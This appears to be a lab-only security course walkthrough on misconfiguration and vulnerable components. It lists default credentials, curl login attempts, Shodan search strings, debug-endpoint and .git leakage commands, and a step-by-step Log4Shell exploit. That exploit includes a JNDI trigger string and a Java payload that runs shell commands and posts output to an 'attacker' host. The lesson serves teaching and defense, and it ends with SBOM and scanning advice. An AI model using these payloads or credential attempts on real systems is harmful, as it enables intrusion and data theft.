# Week 14: Attack walkthrough — Security Misconfiguration & Vulnerable Components

> ⚠️ **Lab only.**

---

## The framing

Most of this week's bugs aren't "code-level vulnerabilities" — they're operational ones. A perfectly written Spring Boot service running on a Tomcat with `admin:admin` console access is wide-open. A perfectly architected API behind a perfectly configured load balancer with `DEBUG=True` in production leaks env vars. The patterns are obvious in hindsight; the work is making sure they don't pile up.

## Part 1: Default credentials

### The pattern

A piece of software ships with a default account so the operator can log in for first-time setup. The setup wizard tells the operator to change it. The operator does, on production. But not on staging. Or the dev VM. Or the partner sandbox copy that ended up in a public Docker image.

### Common default-credential targets

| Component | Default creds | Where to look |
|---|---|---|
| Tomcat Manager | `admin:admin`, `tomcat:tomcat`, `admin:password` | `/manager/html` |
| Jenkins | None by default (newer) — but older installs had open `/script` | `/script` |
| GitLab admin | `root:5iveL!fe` (pre-config) | `/users/sign_in` |
| Grafana | `admin:admin` | `/login` |
| MongoDB | No auth (pre-4.x default) | port 27017 |
| Redis | No auth (default) | port 6379 |
| Elasticsearch | No auth (until X-Pack) | port 9200 |
| Kubernetes Dashboard | Token-required, but old configs had anonymous | Internal cluster IP |
| Solr | Open by default | port 8983 |
| Apache CouchDB ≤1.x | Open by default | port 5984 |
| FTP servers | `anonymous`, `admin:admin` | port 21 |
| Network appliances (routers, switches) | `admin:admin`, vendor-doc creds | management interface |

The famous CVEs in this category aren't "code" CVEs — they're vendor-doc credentials and shodan.io.

### Step 1: Recon

```bash
nmap -sV -p- target.example
nmap -sV -sC -p 21,22,80,443,3306,5432,5984,6379,8080,8983,9200,27017 target
```

### Step 2: Try the defaults

```bash
# Tomcat Manager
curl -u admin:admin http://target:8080/manager/html/list

# Grafana
curl -u admin:admin http://target:3000/api/admin/users

# Redis (no auth)
redis-cli -h target

# Mongo (no auth)
mongosh mongodb://target:27017
```

CVE collections like [SecLists default-credentials](https://github.com/danielmiessler/SecLists/tree/master/Passwords/Default-Credentials) ship known defaults per vendor.

### Step 3: Pivot from default-credential to RCE

- **Tomcat Manager with default creds** → upload a WAR file → RCE.
- **Jenkins script console** → Groovy `Runtime.exec()` → RCE.
- **Grafana admin** → install a plugin from a malicious URL.
- **Redis no-auth** → write SSH keys, write cron jobs (the classic `CONFIG SET dir /var/spool/cron/` chain).
- **Mongo no-auth** → exfil entire database, or write a backdoor user.

### The real-world version: shodan.io

Shodan indexes the entire internet by port + banner. Searches like:

```
mongodb "GridFS" port:27017 country:US
elasticsearch port:9200
"X-Jenkins" "X-Hudson" port:8080
```

Return tens of thousands of exposed instances at any given moment. Authorized engagements use Shodan as recon; unauthorized ones use it for opportunistic compromise. **Looking at Shodan results for an organization you don't own is not authorized testing — it's reconnaissance for the kind of attack we're not teaching.**

## Part 2: Verbose error messages & debug pages

### The pattern: Django DEBUG=True

```python
# settings.py
DEBUG = True   # forgotten in production
ALLOWED_HOSTS = ["*"]
```

Trigger any error:

```http
GET /nonexistent-page HTTP/1.1
Host: vulnerable.example
```

The response includes:

- Full stack trace
- All Python locals at each frame
- Every Django setting (including `SECRET_KEY` and `DATABASES`)
- All environment variables (including `AWS_SECRET_ACCESS_KEY`, `STRIPE_KEY`, etc.)
- Database table layout

In one HTTP request you've owned the entire app.

### Step 1: Provoke errors

```
GET /<random-string>          # 404 with debug info
GET /api/users/<not-a-number> # parse error → traceback
GET /api/<endpoint>?<bad>     # validation error → traceback
```

### Step 2: Common debug-enabled endpoints

| Framework | Debug surface |
|---|---|
| Django | Yellow debug page on any exception |
| Flask | Werkzeug interactive debugger PIN (or open, with `WERKZEUG_DEBUG_PIN=off`) |
| Rails | `/rails/info/routes`, `/rails/info/properties` (development env) |
| Express + `debug` | `/_debug`, console output |
| Spring Boot Actuator | `/actuator/env`, `/actuator/heapdump`, `/actuator/loggers` |
| PHP `phpinfo()` | `phpinfo.php` files left in webroot |
| ASP.NET Yellow Screen of Death | Stack trace + config dump |

Spring Boot Actuator deserves a paragraph. If the operator exposes the `env` endpoint:

```bash
curl http://target/actuator/env
# returns ALL environment variables — JDBC URLs, API keys, ...
```

And if `heapdump` is exposed:

```bash
curl -o heap.bin http://target/actuator/heapdump
strings heap.bin | grep -i "secret\|password\|key\|token"
```

A live heap dump contains active sessions, DB credentials, API keys.

### Step 3: Source code disclosure

Backup files left in the web root:

```
GET /index.php.bak
GET /database.config.old
GET /.env
GET /.git/config
GET /.git/HEAD
GET /.svn/entries
```

`/.git/` is particularly bad. If accessible, you can download the entire repo:

```bash
git clone http://target/.git/  # if directory listing on
# OR
wget -r http://target/.git/   # walks the static files
git-dumper http://target/.git ./repo   # tool that reconstructs missing pieces
```

PortSwigger's "Source code disclosure via backup files" lab is this.

### Step 4: Information from version-control comments

```bash
git log -p --all | grep -i "todo\|fixme\|hack\|password\|key"
```

When you've cloned via the `.git` exposure or via the published GitHub repo, the diff history often contains accidentally-committed-then-removed secrets (Week 10).

## Part 3: Vulnerable component — Log4Shell walkthrough

CVE-2021-44228. The single most consequential application-security incident of the 2020s. It's the canonical "an unpatched library is RCE" lesson.

### The vulnerability in one line

Log4j's pattern syntax included `${jndi:...}` substitutions. If user input was logged via `logger.info(userInput)`, an attacker could send `${jndi:ldap://attacker.com/Exploit}` as input, and Log4j would do an LDAP lookup that returned a Java class URL, which Log4j would download and instantiate, executing arbitrary code.

### Step 1: Verify the lab

```bash
curl -A "test" http://localhost:8080/
# expect a 200 — the app logs the User-Agent
```

### Step 2: Stand up the attacker JNDI/LDAP server

In one terminal:

```bash
cd marshalsec
# On Docker Desktop, host.docker.internal resolves to your host from inside the container.
# On Linux: use the bridge-gateway IP (often 172.17.0.1) instead.
java -cp target/marshalsec-0.0.3-SNAPSHOT-all.jar \
  marshalsec.jndi.LDAPRefServer "http://host.docker.internal:8888/#Exploit"
```

This LDAP server responds to lookups by saying "go fetch the class `Exploit` from `http://host.docker.internal:8888/`" — a URL the container can resolve back to your host.

### Step 3: Stand up the HTTP server hosting the payload class

Create `Exploit.java`:

```java
public class Exploit {
    static {
        try {
            Runtime.getRuntime().exec(new String[]{"/bin/sh", "-c",
                "id > /tmp/pwned && curl -X POST http://attacker/exfil --data-binary @/tmp/pwned"});
        } catch (Exception e) {}
    }
}
```

Compile:

```bash
javac Exploit.java
```

Serve from port 8888 on your host (the container reaches it via `host.docker.internal` per Step 4 below):

```bash
python3 -m http.server 8888
```

### Step 4: Trigger

The vulnerable app runs **inside a container**, so from its perspective `localhost` is the container itself — your host's marshalsec LDAP and HTTP server are not reachable as `localhost`. Use one of:

- **Docker Desktop (Mac/Windows):** the magic hostname `host.docker.internal` resolves to the host.
- **Linux:** either run the container with `--network host` (so `localhost` actually means the host) **or** find the bridge gateway via `docker inspect vuln-app --format '{{(index .NetworkSettings.Networks "bridge").Gateway}}'` (typically `172.17.0.1`) and use that IP.

The trigger string, on Docker Desktop:

```bash
curl -A '${jndi:ldap://host.docker.internal:1389/Exploit}' http://localhost:8080/
```

If nothing happens, validate from inside the container that you can reach the LDAP server:

```bash
docker exec vuln-app sh -c "getent hosts host.docker.internal && nc -zv host.docker.internal 1389"
```

Connection refused → use the bridge-gateway IP instead. Apply the same hostname change to the `LDAPRefServer "http://host.docker.internal:8888/#Exploit"` argument from Step 2.

The chain:

1. Spring Boot app receives the request.
2. Log4j logs the User-Agent.
3. Log4j sees `${jndi:...}` and resolves the substitution.
4. Log4j connects to your LDAP server (port 1389).
5. LDAP server returns a reference: "the class is at `http://host.docker.internal:8888/Exploit.class`".
6. Log4j fetches the class file.
7. Log4j instantiates `Exploit`. Its static block runs.
8. `Runtime.exec("/bin/sh", "-c", "id > /tmp/pwned ...")` executes.

You can verify:

```bash
docker exec vuln-app cat /tmp/pwned
# uid=0(root) gid=0(root) ...
```

You have RCE inside the container.

### Why was this a 10/10 incident?

- Log4j is the de facto Java logging library — millions of services included it.
- The trigger string fit in any logged field — User-Agent, X-Forwarded-For, username, search input, email, hostname seen by a SaaS form.
- The exploit was a single string. No exploit kit. No deobfuscation. Any 2-line Python script could spray the internet.
- The class of attack — RCE via logging — was not in anyone's threat model.

### Step 5: Bypasses that emerged in the following weeks

The first patch (`2.15.0`) disabled JNDI lookups by default but had a bypass (CVE-2021-45046, fixed in `2.16.0`). `2.16.0` removed the message lookup substitution entirely but a recursive-lookup DoS existed (CVE-2021-45105, fixed in `2.17.0`). Then a JDBC-Appender JNDI variant surfaced (CVE-2021-44832, fixed in `2.17.1`). The real terminal version was **2.17.1**, not 2.17.0.

The lesson: **the patch arrives at version N, but real exploitation often requires N+2 or N+3.** Track CVEs, not just "we upgraded."

## Part 4: SBOM and the supply chain

### What an SBOM is

A Software Bill of Materials lists every component (direct + transitive) your software ships with, along with its version. CycloneDX and SPDX are the two standard formats.

### Generate one

```bash
# Syft — supports basically every ecosystem
syft your-app:latest -o cyclonedx-json > sbom.json

# In Python:
syft scan dir:. -o spdx-json > sbom.json

# In Java (Maven):
mvn org.cyclonedx:cyclonedx-maven-plugin:makeAggregateBom
```

The file contains hundreds (often thousands) of components for a typical web app.

### Why this matters

When the next Log4Shell drops:

1. The CVE is assigned to a component name + affected version range.
2. You search every SBOM in your org for that range.
3. You patch only what's actually affected.

Without SBOMs, the response to "we use Log4j somewhere" is "let's grep our codebase" — which misses transitive deps, embedded JARs, Docker base images. **The first 72 hours of Log4Shell were spent by ~every company finding out where Log4j was inside their stack.** Companies with current SBOMs found everything in an hour.

### Step: scan for known CVEs

```bash
trivy image your-app:latest
grype your-app:latest
syft scan your-app:latest | grype
```

These tools compare SBOM components to a CVE database. Output: a list of CVEs affecting your image, ranked by severity.

```
log4j-core 2.14.1  CVE-2021-44228  CRITICAL
spring-core 5.2.0  CVE-2022-22965  CRITICAL
openssl 1.1.1k     CVE-2022-0778   HIGH
...
```

## Part 5: Other misconfig variants

### CORS misconfig (Week 09 — repeated here because it's discovered as misconfig in practice)

```http
Access-Control-Allow-Origin: *
Access-Control-Allow-Credentials: true
```

This combination is rejected by browsers (the spec disallows it), but the misconfig pattern shows up constantly. Lots of variants in [Week 09 attack.md](../week-09-csrf-cors-sop/attack.md).

### Permissive S3 buckets

`s3:GetObject` allowed to `*` → public read of any object name.
`s3:ListBucket` allowed to `*` → public enumeration of object names.
Both → "we found 10 million PDF receipts of $RANDOM company's customers."

### Open admin panels behind security-through-obscurity

`/admin` blocked from the public IP but the staging environment has no IP allow-list. Found via subdomain enumeration:

```bash
subfinder -d example.com -all
```

`staging.example.com/admin` exposed.

### Permissions on database dumps left in `/backup/`

```
GET /backup/dump-2025-12-31.sql      # full DB
GET /backup/users.csv                # exported data
```

The webserver served the directory; the operator never realized.

## Common mistakes when learning

- **Assuming "we patch monthly" is enough.** Log4Shell-class CVEs require hours, not weeks.
- **Conflating SCA scans with pen tests.** SCA finds *known* vulnerable versions. It doesn't find logic bugs.
- **Ignoring transitive deps.** Most CVEs are in dependencies of dependencies.
- **Treating "we passed the audit" as "we're secure."** A point-in-time audit doesn't catch tomorrow's bad deploy.
- **Discovery without action.** Finding Log4j 2.14 in your fleet is step 1; tracking it through patch, redeploy, verify is the actual work.

Now read [defense.md](defense.md).
